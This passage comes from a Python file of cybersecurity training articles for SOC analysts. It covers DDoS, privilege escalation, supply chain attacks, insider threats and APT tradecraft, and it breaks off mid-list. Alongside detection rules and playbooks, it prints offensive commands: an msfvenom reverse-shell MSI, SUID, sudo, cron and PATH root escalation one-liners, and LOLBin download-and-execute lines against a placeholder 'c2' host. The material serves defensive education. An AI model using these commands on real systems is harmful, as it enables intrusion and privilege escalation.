# bcrypt:   ~180 kH/s (RTX 4090)
# SHA-256:  ~22 GH/s  (RTX 4090)
```

## Defense Strategies

| Control | Purpose | Implementation |
|---------|---------|----------------|
| MFA | Stops credential theft | TOTP, FIDO2/WebAuthn, push |
| Account lockout | Stops online brute force | Lock after 5 failures, 15 min |
| Rate limiting | Slows automated attacks | Progressive delays |
| Password policy | Enforce complexity + length | Minimum 12 chars, check breach lists |
| Strong hashing | Slows offline cracking | bcrypt/scrypt/Argon2 with high cost |
| Salting | Defeats rainbow tables | Unique random salt per password |
| Credential monitoring | Detect leaked passwords | HaveIBeenPwned API, dark web monitoring |
| Passwordless auth | Eliminate passwords | FIDO2 security keys, passkeys |

## Modern Password Hashing Comparison

| Algorithm | Type | GPU Resistance | Recommended |
|-----------|------|---------------|-------------|
| MD5 | Fast hash | None | Never for passwords |
| SHA-256 | Fast hash | None | Never for passwords |
| bcrypt | Adaptive | Good | Yes (cost 12+) |
| scrypt | Memory-hard | Very good | Yes |
| Argon2id | Memory-hard | Excellent | Best choice |
| PBKDF2 | Iterative | Moderate | Acceptable (600K+ iterations) |

## SOC Analyst Response to Password Attack Incidents

1. **Detect**: Identify attack type from authentication logs
2. **Scope**: Determine targeted accounts and success rate
3. **Contain**: Block source IPs, force MFA challenges
4. **Investigate**: Check successful logins for attacker activity
5. **Remediate**: Reset compromised accounts, notify users
6. **Harden**: Implement MFA, review password policies
7. **Monitor**: Deploy enhanced detection rules
"""
    ))

    # ------------------------------------------------------------------
    # 7. Denial of Service and DDoS Attacks
    # ------------------------------------------------------------------
    articles.append((
        "Denial of Service and DDoS Attacks",
        ["attacks", "DoS", "DDoS", "amplification", "SYN-flood", "mitigation"],
        r"""# Denial of Service and DDoS Attacks

## Overview

Denial of Service (DoS) attacks aim to make a system, service, or network
unavailable to legitimate users. Distributed Denial of Service (DDoS) uses
multiple compromised systems (botnets) to amplify the attack. DDoS attacks
have exceeded 3 Tbps in peak volume and are frequently used for extortion,
hacktivism, and as smokescreens for other intrusions.

## DoS vs DDoS

| Aspect | DoS | DDoS |
|--------|-----|------|
| Sources | Single system | Thousands/millions of systems |
| Volume | Limited by attacker bandwidth | Massive (Tbps possible) |
| Mitigation | Block source IP | Complex (many sources) |
| Cost to attacker | Minimal | Botnet rental ($50-500/hr) |
| Detection | Straightforward | Harder (legitimate-looking traffic) |

## Attack Categories

### 1. Volumetric Attacks (Layer 3/4)
Overwhelm bandwidth with sheer traffic volume.

| Attack | Protocol | Amplification Factor |
|--------|----------|---------------------|
| DNS Amplification | UDP/53 | 28-54x |
| NTP Amplification | UDP/123 | 556x |
| Memcached Amplification | UDP/11211 | 51,000x |
| SSDP Amplification | UDP/1900 | 30x |
| CLDAP Amplification | UDP/389 | 56-70x |
| CharGEN | UDP/19 | ~358x |

**DNS Amplification mechanics:**
```
1. Attacker spoofs victim IP as source
2. Sends small DNS queries (60 bytes) to open resolvers
3. Resolvers send large responses (3400+ bytes) to victim
4. 54x amplification: 1 Gbps attack = 54 Gbps at victim

Attacker (spoofed src=Victim) --> Open DNS Resolvers
                                      |
                     Large DNS responses (ANY queries)
                                      |
                                      v
                                   Victim (flooded)
```

### 2. Protocol Attacks (Layer 3/4)
Exploit protocol weaknesses to exhaust server or infrastructure resources.

**SYN Flood:**
```
# Normal TCP handshake:
Client --> SYN --> Server
Client <-- SYN-ACK <-- Server
Client --> ACK --> Server (connection established)

# SYN Flood:
Attacker --> SYN (spoofed src) --> Server
Server allocates resources, sends SYN-ACK to spoofed IP
SYN-ACK goes unanswered, server holds half-open connection
Repeat thousands of times -> connection table exhausted
```

**Detection indicators:**
```
# High number of half-open connections
netstat -an | grep SYN_RECV | wc -l

# Firewall logs showing SYN without ACK completion
# Rapid increase in new connections without established state

# Sigma rule for SYN flood detection
title: SYN Flood Detected
logsource:
    category: firewall
detection:
    selection:
        action: allow
        tcp_flags: 'S'
    timeframe: 1m
    condition: selection | count() by dst_ip > 10000
```

### 3. Application Layer Attacks (Layer 7)
Target specific application functionality with legitimate-looking requests.

**Slowloris:**
```
# Keeps many connections open by sending partial HTTP headers
# Never completes the request, exhausting server connection pool

GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Header: <partial...>   <-- never sends final \r\n\r\n
# Periodically sends additional partial headers to keep alive
X-Another: value\r\n      <-- keeps connection alive
```

**HTTP Flood:**
```
# Legitimate-looking GET/POST requests at high volume
# Hard to distinguish from real traffic
GET /search?q=random_string_1234 HTTP/1.1
GET /api/products?page=1&sort=name HTTP/1.1
POST /login (with random credentials)
```

**Other Layer 7 attacks:**
- ReDoS (Regular Expression DoS) - crafted input causes exponential regex processing
- Hash collision DoS - crafted POST data causes hash table worst-case
- XML bomb - nested entity expansion consumes memory
- API abuse - expensive queries or bulk operations

## Real-World DDoS Examples

| Year | Target | Type | Peak Volume |
|------|--------|------|-------------|
| 2016 | Dyn DNS | Mirai botnet (IoT) | 1.2 Tbps |
| 2018 | GitHub | Memcached amplification | 1.35 Tbps |
| 2020 | AWS | CLDAP reflection | 2.3 Tbps |
| 2023 | Google | HTTP/2 Rapid Reset | 398M rps |

## Detection Strategies

```
# Network flow analysis
# Sudden spike in traffic volume (baseline deviation)
# Unusual protocol distribution (all UDP, single port)
# Geographic anomaly (traffic from unexpected regions)

# Firewall/IDS indicators
# Connection rate exceeding thresholds
# Packet size anomalies (amplification uses large packets)
# Source IP entropy changes (many sources = DDoS)

# Application monitoring
# Response time degradation
# Error rate increase (503 Service Unavailable)
# Connection pool exhaustion alerts
# CPU/memory spikes without proportional legitimate traffic
```

## Mitigation Strategies

| Layer | Control | Description |
|-------|---------|-------------|
| Network | Rate limiting | Limit connections per source IP |
| Network | Blackhole routing | Drop traffic to target IP at ISP level |
| Network | BGP Flowspec | Fine-grained traffic filtering at router |
| Infrastructure | CDN/DDoS protection | Cloudflare, Akamai, AWS Shield |
| Infrastructure | Anycast | Distribute traffic across global PoPs |
| Infrastructure | Scrubbing centers | Filter malicious traffic, forward clean |
| Protocol | SYN cookies | Stateless SYN handling |
| Protocol | TCP connection limits | Max connections per source |
| Application | WAF | Filter malicious application requests |
| Application | CAPTCHA | Challenge suspected bot traffic |
| Application | Request throttling | Rate limit API/page requests |

## SOC Response Playbook

1. **Detect**: Alert on traffic anomaly or service degradation
2. **Classify**: Determine attack type (volumetric/protocol/application)
3. **Activate**: Engage DDoS mitigation service (Cloudflare, AWS Shield)
4. **Filter**: Implement emergency firewall rules or BGP blackhole
5. **Communicate**: Notify stakeholders and affected service owners
6. **Monitor**: Track mitigation effectiveness in real-time
7. **Document**: Record attack vectors, duration, peak volume
8. **Review**: Post-incident analysis and defense improvements

## Key Metrics During DDoS

- Packets per second (PPS)
- Bits per second (BPS)
- Requests per second (RPS)
- Connection rate and concurrent connections
- Error rate and response latency
- Source IP count and geographic distribution
"""
    ))

    # ------------------------------------------------------------------
    # 8. Privilege Escalation Techniques and Detection
    # ------------------------------------------------------------------
    articles.append((
        "Privilege Escalation Techniques and Detection",
        ["attacks", "privilege-escalation", "kernel-exploits", "DLL-hijacking", "detection"],
        r"""# Privilege Escalation Techniques and Detection

## Overview

Privilege escalation occurs when an attacker gains higher-level permissions than
initially obtained. It is a critical phase in nearly every attack chain, as
initial access rarely provides the permissions needed for the attacker's objectives.

## Types of Privilege Escalation

| Type | Description | Example |
|------|-------------|---------|
| Vertical | Low privilege to high privilege | User to Administrator/root |
| Horizontal | Same privilege, different account | User A accesses User B data |

## Windows Privilege Escalation

### Unquoted Service Paths
If a service binary path contains spaces and is not quoted, Windows tries
multiple paths in order, allowing DLL/EXE planting.

```
# Vulnerable service path (unquoted with spaces):
C:\Program Files\My App\Service\app.exe

# Windows tries in order:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\Service\app.exe

# If attacker can write to C:\Program Files\My.exe, it runs as SYSTEM

# Detection: find unquoted service paths
wmic service get name,displayname,pathname,startmode |
    findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v ^"
```

### DLL Hijacking
Placing a malicious DLL where a program will load it before the legitimate one.

```
# DLL search order (standard):
1. Application directory
2. System directory (C:\Windows\System32)
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories

# If application loads missing DLL, attacker places it in search path

# Detection: Sysmon Event ID 7 (Image Loaded)
# Watch for DLLs loaded from unusual paths
EventID: 7
Image: C:\Program Files\TrustedApp\app.exe
ImageLoaded: C:\Users\Public\Downloads\malicious.dll
Signed: false
```

### Token Impersonation
Stealing or forging Windows access tokens to assume another user's identity.

```
# Tools: Incognito, Juicy Potato, PrintSpoofer, GodPotato

# SeImpersonatePrivilege abuse (common on service accounts)
# Check current privileges
whoami /priv

# If SeImpersonatePrivilege is enabled:
# Use PrintSpoofer to escalate from Service to SYSTEM
PrintSpoofer.exe -i -c cmd.exe

# Detection: Event ID 4672 (Special privileges assigned to new logon)
# Watch for unexpected token privilege use
```

### Misconfigured Services
Services running as SYSTEM with weak permissions on their binary or registry.

```powershell
# Check service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Check if service binary is writable
icacls "C:\Program Files\VulnService\service.exe"
# If Users have (F) or (M) permission -> replace binary

# Detection: monitor service binary modifications
# Sysmon Event ID 11 (FileCreate) on service binary paths
# Event ID 7045 (new service installed)
```

### AlwaysInstallElevated
If both HKLM and HKCU AlwaysInstallElevated keys are set to 1, any user
can install MSI packages with SYSTEM privileges.

```
# Check registry keys
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit: create malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi > shell.msi
msiexec /quiet /qn /i shell.msi
```

## Linux Privilege Escalation

### SUID/SGID Binaries
Files with SUID bit run with the file owner's privileges (often root).

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common SUID escalation vectors (GTFOBins)
# If find has SUID:
find . -exec /bin/sh -p \;

# If python has SUID:
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# If vim has SUID:
vim -c ':!/bin/sh'
```

### Sudo Misconfigurations
Overly permissive sudo rules allow escalation.

```bash
# Check sudo permissions
sudo -l

# Dangerous sudo entries:
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \;

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/bash
```

### Kernel Exploits
Exploiting vulnerabilities in the operating system kernel.

| CVE | Name | Affected | Impact |
|-----|------|----------|--------|
| CVE-2016-5195 | Dirty COW | Linux < 4.8.3 | Write to read-only memory |
| CVE-2021-4034 | PwnKit | Polkit (most distros) | Local root via pkexec |
| CVE-2022-0847 | Dirty Pipe | Linux 5.8-5.16.11 | Overwrite read-only files |
| CVE-2023-0386 | OverlayFS | Linux < 6.2 | File capability escalation |

### Cron Job Exploitation
Writable scripts executed by root cron jobs.

```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l

# If root cron runs a writable script:
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/writable/script.sh
# Wait for cron execution, then:
/tmp/rootbash -p
```

### Path Hijacking
If a privileged script calls a binary without full path, attacker can
create a malicious version earlier in PATH.

```bash
# Vulnerable script (runs as root):
#!/bin/bash
service apache2 restart    # No full path

# Exploit:
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/service
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/service
chmod +x /tmp/service
# When script runs, our /tmp/service executes as root
```

## Detection Strategies

| Technique | Detection Method | Log Source |
|-----------|-----------------|------------|
| Unquoted service paths | Audit service configurations | Service install logs |
| DLL hijacking | Unsigned DLL loads from unusual paths | Sysmon Event ID 7 |
| Token impersonation | Special privilege assignments | Event ID 4672 |
| SUID abuse | Monitor SUID binary execution | auditd, osquery |
| Sudo escalation | Sudo command logging | /var/log/auth.log, sudoers |
| Kernel exploits | Exploit code artifacts, crashes | dmesg, syslog |
| Cron exploitation | Cron job file modifications | File integrity monitoring |

## Automated Enumeration Tools

| Tool | Platform | Description |
|------|----------|-------------|
| WinPEAS | Windows | Comprehensive Windows privesc checker |
| LinPEAS | Linux | Comprehensive Linux privesc checker |
| PowerUp | Windows | PowerShell-based Windows checks |
| linux-exploit-suggester | Linux | Kernel exploit matcher |
| BeRoot | Both | Common misconfig checker |
| Seatbelt | Windows | C# security audit tool |

## SOC Detection Rules

```yaml
# Sigma rule: suspicious SUID binary execution
title: Unusual SUID Binary Execution
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        key: suid_exec
    filter_known:
        exe:
            - /usr/bin/passwd
            - /usr/bin/sudo
            - /usr/bin/su
    condition: selection and not filter_known

# Sigma rule: service binary modification
title: Service Binary Replaced
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 11
        TargetFilename|endswith: '.exe'
        TargetFilename|contains:
            - '\Windows\System32\'
            - '\Program Files\'
    condition: selection
```

## Key Takeaways

- Always enumerate privesc vectors during incident investigation
- Most privesc relies on misconfigurations, not zero-days
- Principle of least privilege is the primary preventive control
- Monitor privileged operations and unexpected privilege grants
- Automated tools can find what manual review might miss
"""
    ))

    # ------------------------------------------------------------------
    # 9. Supply Chain Attacks and Third-Party Risk
    # ------------------------------------------------------------------
    articles.append((
        "Supply Chain Attacks and Third-Party Risk",
        ["threats", "supply-chain", "third-party-risk", "SolarWinds", "software-supply-chain"],
        r"""# Supply Chain Attacks and Third-Party Risk

## Overview

Supply chain attacks compromise a trusted third-party product, service, or process
to gain access to downstream targets. Rather than attacking the well-defended
primary target directly, adversaries infiltrate a less-secure supplier in the
chain. These attacks are devastating because they exploit inherent trust
relationships and can affect thousands of organizations simultaneously.

## Supply Chain Attack Categories

| Category | Description | Example |
|----------|-------------|---------|
| Software supply chain | Compromise build/update pipeline | SolarWinds Orion |
| Package repository | Inject malicious packages | ua-parser-js npm |
| Hardware supply chain | Tamper with physical components | SuperMicro allegations |
| Service provider | Compromise managed service | Kaseya VSA |
| Code dependency | Exploit vulnerable library | Log4Shell in Log4j |
| CI/CD pipeline | Compromise build systems | Codecov bash uploader |

## Major Supply Chain Attack Case Studies

### SolarWinds SUNBURST (2020)
One of the most sophisticated supply chain attacks in history.

**Attack timeline:**
```
Oct 2019: Attacker accesses SolarWinds build environment
Feb 2020: SUNBURST malicious code injected into Orion build
Mar 2020: Trojanized Orion update 2020.2 released to ~18,000 customers
Dec 2020: FireEye detects and discloses the compromise
```

**Technical details:**
- Malicious DLL (SolarWinds.Orion.Core.BusinessLayer.dll) shipped in signed update
- 2-week dormancy period before C2 activation
- Used steganography in HTTP responses for C2 communication
- DNS-based C2 encoded victim info in subdomain queries
- Targeted high-value organizations (USG agencies, tech companies)

**Detection indicators:**
```
# DNS queries to avsvmcloud.com (C2 domain)
# DLL hash: 019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134
# Named pipes: 583da945-62af-10e8-4902-a8f205c72b2e
# Service: SolarWinds.Orion.Core.BusinessLayer.dll modification timestamp
```

### Kaseya VSA (2021)
REvil ransomware gang exploited Kaseya's remote management software to deploy
ransomware to ~1,500 downstream businesses through ~60 MSPs.

### Codecov (2021)
Attacker modified Codecov's Bash Uploader script to exfiltrate environment
variables (including CI/CD secrets and tokens) from customer pipelines.

### NPM/PyPI Package Attacks
Ongoing campaigns targeting package managers:

| Technique | Description | Example |
|-----------|-------------|---------|
| Typosquatting | Similar package names | colourama vs colorama |
| Dependency confusion | Public package overrides private | Alex Birsan research |
| Account takeover | Compromise maintainer accounts | ua-parser-js hijacking |
| Protestware | Maintainer adds malicious code | node-ipc (anti-war) |
| Star-jacking | Clone repos with inflated stars | Multiple PyPI packages |

## Hardware Supply Chain Threats

- Component tampering during manufacturing
- Counterfeit components with reduced security
- Firmware implants in network equipment
- Modified chips with hardware backdoors
- Intercepted shipments (intelligence agencies)

## Defending Against Supply Chain Attacks

### Software Supply Chain Controls

| Control | Description | Implementation |
|---------|-------------|----------------|
| SBOM | Software Bill of Materials | Track all components/dependencies |
| Code signing | Verify software authenticity | Require signed packages |
| Build verification | Reproducible builds | Compare builds from source |
| Dependency pinning | Lock dependency versions | Package lock files |
| Vendoring | Copy dependencies locally | Reduce external trust |
| Integrity verification | Hash verification | SHA-256 checksums on downloads |
| Private registry | Mirror public packages | Artifactory, Nexus |

### Vendor Risk Management

```
# Vendor assessment framework:
1. Security questionnaire (SIG, CAIQ)
2. SOC 2 Type II report review
3. Penetration test results
4. Incident response plan review
5. Business continuity plan review
6. Data handling practices
7. Access control documentation
8. Subprocessor/fourth-party risk
9. Contractual security requirements
10. Ongoing monitoring and reassessment
```

### Detection Strategies

```
# Monitor for supply chain compromise indicators:

# 1. Software update anomalies
# - Updates outside normal schedule
# - Update binary hash doesn't match vendor-published hash
# - Unusual network connections after updates

# 2. Dependency monitoring
# - New or changed dependencies in build pipeline
# - Dependency version changes without developer action
# - Known-vulnerable dependency alerts (Dependabot, Snyk)

# 3. Build pipeline integrity
# - Unauthorized changes to CI/CD configuration
# - Modified build scripts or Dockerfiles
# - New outbound connections from build servers

# SIEM correlation rule example:
# Alert when trusted software makes unexpected outbound connections
title: Trusted Software Unexpected Network Connection
logsource:
    category: firewall
detection:
    selection:
        src_process:
            - 'SolarWinds*'
            - 'ManageEngine*'
            - 'Kaseya*'
    filter_known:
        dst_ip|cidr:
            - '10.0.0.0/8'
    filter_vendor:
        dst_domain|endswith:
            - '.solarwinds.com'
            - '.manageengine.com'
    condition: selection and not filter_known and not filter_vendor
```

## Supply Chain Risk Assessment Framework

| Risk Level | Criteria | Response |
|-----------|----------|----------|
| Critical | Internet-facing, privileged access, broad deployment | Continuous monitoring, SBOM, network isolation |
| High | Access to sensitive data, many users | Quarterly review, integrity monitoring |
| Medium | Limited access, contained scope | Annual review, update monitoring |
| Low | No privileged access, limited data | Standard vendor management |

## SOC Analyst Supply Chain Monitoring

1. Maintain inventory of all third-party software and services
2. Subscribe to vendor security advisories
3. Monitor vendor breach notification feeds
4. Track software update hashes against vendor-published values
5. Alert on new outbound connections from vendor software
6. Review SBOM for newly disclosed vulnerabilities
7. Monitor package manager audit alerts in CI/CD
8. Implement network segmentation for vendor management tools
9. Log and alert on vendor remote access sessions
10. Participate in industry ISACs for supply chain threat intel
"""
    ))

    # ------------------------------------------------------------------
    # 10. Insider Threats Detection and Prevention
    # ------------------------------------------------------------------
    articles.append((
        "Insider Threats Detection and Prevention",
        ["threats", "insider-threat", "DLP", "UEBA", "monitoring", "data-exfiltration"],
        r"""# Insider Threats: Detection and Prevention

## Overview

Insider threats originate from people with authorized access -- employees,
contractors, partners, or former staff. They are among the most difficult
threats to detect because insiders operate within trusted boundaries using
legitimate credentials. The average insider threat incident costs $15.4 million
and takes 85 days to contain (Ponemon Institute).

## Types of Insider Threats

| Type | Description | Percentage |
|------|-------------|------------|
| Negligent | Careless mistakes, policy violations | ~62% |
| Malicious | Intentional theft, sabotage, fraud | ~23% |
| Compromised | External actor using stolen credentials | ~14% |
| Third-party | Vendor/contractor with excessive access | Varies |

## Indicators of Insider Threat

### Behavioral Indicators (Pre-Incident)
- Disgruntlement or conflict with management
- Financial difficulties or sudden lifestyle changes
- Discussions about leaving the organization
- Working unusual hours without business justification
- Interest in projects outside their responsibility
- Resistance to security policies or audits

### Technical Indicators

```
# Data exfiltration indicators:
# - Large file downloads or copies to removable media
# - Unusual email attachments (size or frequency)
# - Cloud storage uploads (personal Dropbox, Google Drive)
# - Printing sensitive documents outside normal patterns
# - Accessing files unrelated to job function

# Access anomalies:
# - Logins outside normal hours or from unusual locations
# - Privilege escalation attempts
# - Accessing departing-employee restricted systems
# - Bulk database queries beyond normal patterns
# - VPN connections during vacation or leave

# System abuse:
# - Installing unauthorized software
# - Disabling security tools or logging
# - Creating unauthorized accounts or backdoors
# - Modifying access controls on sensitive files
# - Using screen capture or keylogging tools
```

### Temporal Risk Indicators

| Period | Risk Level | Common Behavior |
|--------|-----------|-----------------|
| Resignation notice | Very High | Data collection and exfiltration |
| PIP (Performance Improvement Plan) | High | Sabotage, data theft |
| Passed over for promotion | High | Resentment-driven actions |
| Corporate restructuring | Medium-High | Uncertainty leads to data hoarding |
| New contractor onboarding | Medium | Excessive access exploration |
| Normal operations | Low | Baseline monitoring |

## Monitoring Strategies

### User and Entity Behavior Analytics (UEBA)

UEBA establishes behavioral baselines and detects anomalies.

```
# UEBA baseline metrics:
# - Normal working hours and locations
# - Typical data access volume and patterns
# - Email sending patterns (recipients, attachments)
# - Application usage patterns
# - Network activity profile
# - File access patterns (types, volumes, shares)

# Anomaly detection examples:
# User normally accesses 50 files/day, suddenly accesses 5,000
# User normally emails internal only, starts emailing external with attachments
# User normally works 9-5, starts accessing systems at 2 AM
# User in marketing accesses engineering source code repository
```

### Data Loss Prevention (DLP)

| DLP Type | Coverage | Examples |
|----------|----------|---------|
| Network DLP | Email, web uploads, FTP | Symantec DLP, Forcepoint |
| Endpoint DLP | USB, print, clipboard | Microsoft Purview, Digital Guardian |
| Cloud DLP | SaaS app uploads | Netskope, McAfee CASB |
| Discovery DLP | Data at rest scanning | Find PII/secrets in file shares |

**DLP policy examples:**
```
# Block USB storage devices (except encrypted corporate devices)
# Alert on emails with >10 attachments to external domains
# Block uploads of source code to personal cloud storage
# Prevent printing of documents marked Confidential
# Alert on bulk database exports exceeding threshold
# Monitor clipboard operations in remote desktop sessions
```

### Access Control Measures

- Principle of least privilege (role-based access)
- Just-in-time (JIT) privileged access
- Separation of duties for critical processes
- Regular access certification reviews
- Immediate access revocation upon termination
- Privileged access management (PAM) solutions

## Investigation Approach

```
# Insider threat investigation workflow:

# Phase 1: Detection
# - UEBA anomaly alert triggered
# - DLP policy violation detected
# - Manager or coworker report
# - HR notification of termination or PIP

# Phase 2: Assessment
# - Validate the alert (is this actual anomalous behavior?)
# - Review user's role and access permissions
# - Check for temporal risk indicators (resignation, PIP)
# - Determine data sensitivity at risk

# Phase 3: Covert Investigation
# - Enhanced monitoring on user's activities
# - Review historical logs (email, file access, web)
# - Preserve evidence with proper chain of custody
# - Coordinate with HR and Legal before any action

# Phase 4: Response
# - Contain based on risk level (access restriction, suspension)
# - Forensic imaging of user's devices
# - Interview (coordinated with HR/Legal)
# - Determine scope of data exposure
# - Remediation and recovery

# Phase 5: Post-Incident
# - Update policies and access controls
# - Refine detection rules based on lessons learned
# - Training and awareness updates
# - Legal proceedings if warranted
```

## Legal and Privacy Considerations

- Monitoring must comply with local privacy laws
- Employee consent may be required (varies by jurisdiction)
- Union agreements may limit monitoring scope
- Privileged communications (legal, medical) require extra care
- Chain of custody for evidence preservation
- Proportionality of monitoring to risk

## Technical Controls Summary

| Control | Purpose | Products |
|---------|---------|----------|
| UEBA | Behavioral anomaly detection | Exabeam, Securonix, Splunk UBA |
| DLP | Data loss prevention | Symantec, Microsoft Purview |
| PAM | Privileged access management | CyberArk, BeyondTrust |
| CASB | Cloud access security | Netskope, Zscaler |
| FIM | File integrity monitoring | Tripwire, OSSEC |
| EDR | Endpoint detection & response | CrowdStrike, SentinelOne |
| Email Gateway | Email content inspection | Proofpoint, Mimecast |
| Network Monitoring | Traffic analysis | Darktrace, Vectra |

## SOC Analyst Insider Threat Checklist

1. Review UEBA alerts for behavioral anomalies daily
2. Monitor DLP policy violations and false positive rates
3. Correlate access anomalies with HR event data (departures, PIPs)
4. Track data movement patterns for sensitive repositories
5. Verify access revocation within SLA for terminated employees
6. Review privileged account usage patterns weekly
7. Investigate after-hours access to sensitive systems
8. Monitor for unauthorized cloud storage usage
9. Alert on bulk data operations exceeding baselines
10. Coordinate with HR on active insider threat cases
"""
    ))

    # ------------------------------------------------------------------
    # 11. Advanced Persistent Threats APT Lifecycle
    # ------------------------------------------------------------------
    articles.append((
        "Advanced Persistent Threats APT Lifecycle",
        ["threats", "APT", "kill-chain", "C2", "lateral-movement", "living-off-the-land"],
        r"""# Advanced Persistent Threats: APT Lifecycle

## Overview

Advanced Persistent Threats (APTs) are sophisticated, well-resourced threat actors
(typically nation-state or state-sponsored) that conduct long-term targeted
intrusions. The term describes both the threat actor and the type of campaign
characterized by persistence, stealth, and specific objectives such as espionage,
intellectual property theft, or sabotage.

## APT Characteristics

| Characteristic | Description |
|---------------|-------------|
| Advanced | Custom tooling, zero-days, operational security |
| Persistent | Maintain access for months or years (median dwell: 16 days, down from 21) |
| Threat | Specific adversary with defined objectives |
| Well-funded | Nation-state budgets, dedicated teams |
| Targeted | Specific organizations or sectors |
| Patient | Willing to wait for optimal attack windows |

## Notable APT Groups

| Group | Nation | Targets | Known For |
|-------|--------|---------|-----------|
| APT28 (Fancy Bear) | Russia | Government, military, media | DNC hack, Olympic attacks |
| APT29 (Cozy Bear) | Russia | Government, think tanks | SolarWinds, COVID research |
| APT41 (Double Dragon) | China | Tech, healthcare, gaming | Both espionage and financial crime |
| Lazarus Group | North Korea | Financial, crypto, defense | Sony hack, WannaCry, $600M crypto theft |
| APT33 (Elfin) | Iran | Energy, aerospace, government | Shamoon, destructive attacks |
| Equation Group | USA (alleged) | Global | Stuxnet, most advanced toolset discovered |
| Kimsuky | North Korea | Think tanks, nuclear policy | Credential theft campaigns |
| Volt Typhoon | China | US critical infrastructure | Living off the land, pre-positioning |

## The Cyber Kill Chain

Developed by Lockheed Martin, maps the stages of a targeted attack.

```
Phase 1: RECONNAISSANCE
    |  OSINT, network scanning, employee profiling
    v
Phase 2: WEAPONIZATION
    |  Exploit + backdoor packaged (e.g., weaponized PDF)
    v
Phase 3: DELIVERY
    |  Spear phishing, watering hole, USB drop
    v
Phase 4: EXPLOITATION
    |  Vulnerability triggered, code execution achieved
    v
Phase 5: INSTALLATION
    |  Persistent backdoor installed (RAT, web shell)
    v
Phase 6: COMMAND & CONTROL (C2)
    |  Outbound channel established to attacker infrastructure
    v
Phase 7: ACTIONS ON OBJECTIVES
       Data exfiltration, lateral movement, destruction
```

## MITRE ATT&CK Mapping (Key APT Techniques)

| Tactic | Common APT Techniques |
|--------|----------------------|
| Initial Access | Spear phishing (T1566), supply chain (T1195), trusted relationship (T1199) |
| Execution | PowerShell (T1059.001), WMI (T1047), scheduled tasks (T1053) |
| Persistence | Registry run keys (T1547), scheduled tasks, web shell (T1505.003) |
| Privilege Escalation | Token manipulation (T1134), exploitation (T1068) |
| Defense Evasion | Obfuscation (T1027), process injection (T1055), LOTL (T1218) |
| Credential Access | Mimikatz (T1003), Kerberoasting (T1558.003) |
| Lateral Movement | PsExec (T1570), RDP (T1021.001), WMI (T1047) |
| Collection | Screen capture (T1113), keylogging (T1056), staged data (T1074) |
| Exfiltration | C2 channel (T1041), cloud storage (T1567), DNS tunneling (T1048) |

## Living off the Land (LOTL)

APTs increasingly use legitimate system tools to avoid detection.

```
# Common LOTL binaries (LOLBins):

# PowerShell - download and execute
powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://c2/payload')"

# certutil - download files
certutil -urlcache -f http://c2/payload.exe C:\temp\payload.exe

# mshta - execute HTA
mshta http://c2/payload.hta

# rundll32 - execute DLL
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval(new ActiveXObject("WScript.Shell").Run("calc"))

# bitsadmin - download files
bitsadmin /transfer job /download /priority high http://c2/payload.exe C:\temp\payload.exe

# wmic - execute process
wmic process call create "powershell -ep bypass -f \\share\payload.ps1"

# regsvr32 - execute scriptlet
regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll
```

## C2 Infrastructure

APTs use sophisticated C2 infrastructure to maintain stealth.

| C2 Technique | Description | Detection |
|-------------|-------------|-----------|
| Domain fronting | Hide C2 in CDN traffic (deprecated by most CDNs) | TLS SNI mismatch |
| DNS tunneling | Encode data in DNS queries/responses | High DNS query volume, long subdomains |
| HTTPS beaconing | Regular HTTPS callbacks to C2 | Periodic connections, JA3 fingerprinting |
| Cloud services | Use legitimate cloud APIs (OneDrive, Dropbox) | Unusual cloud API access patterns |
| Social media | C2 commands in tweets/posts | Unusual social media API usage |
| Steganography | Hide data in images/files | Entropy analysis of transferred files |
| Fast flux DNS | Rapidly changing C2 IP addresses | High TTL churn on DNS records |

## Detection Strategies Across the Kill Chain

| Phase | Detection Opportunity | Log Source |
|-------|----------------------|------------|
| Reconnaissance | Port scans, OSINT queries | IDS, web logs, DNS |
| Delivery | Phishing emails, malicious downloads | Email gateway, proxy logs |
| Exploitation | Exploit attempts, crashes | IDS, EDR, crash dumps |
| Installation | New persistence mechanisms | Sysmon, autoruns, FIM |
| C2 | Beaconing, DNS tunneling | Network flow, DNS logs, proxy |
| Lateral Movement | Unusual auth, remote execution | Windows Event Logs, EDR |
| Exfiltration | Large outbound transfers, DNS exfil | DLP, network flow, proxy |

```yaml
# Sigma rule: detect periodic C2 beaconing
title: Periodic Outbound Connection (Possible C2 Beacon)
logsource:
    category: proxy
detection:
    selection:
        cs-method: 'GET'
    filter_known:
        cs-host|endswith:
            - '.microsoft.com'
            - '.google.com'
            - '.amazonaws.com'
    timeframe: 24h
    condition: selection and not filter_known
        | near(cs-host, interval=300s, count=20)
# Note: Real beaconing detection requires statistical analysis of
# connection intervals (coefficient of variation, frequency analysis)
```

## Dwell Time and APT Response

Average dwell time (attacker present before detection):
- 2017: 101 days (global median, Mandiant)
- 2020: 24 days
- 2023: 10 days (improving but APTs can persist much longer)

**Response priorities for APT incidents:**
1. Do NOT tip off the attacker -- covert investigation first
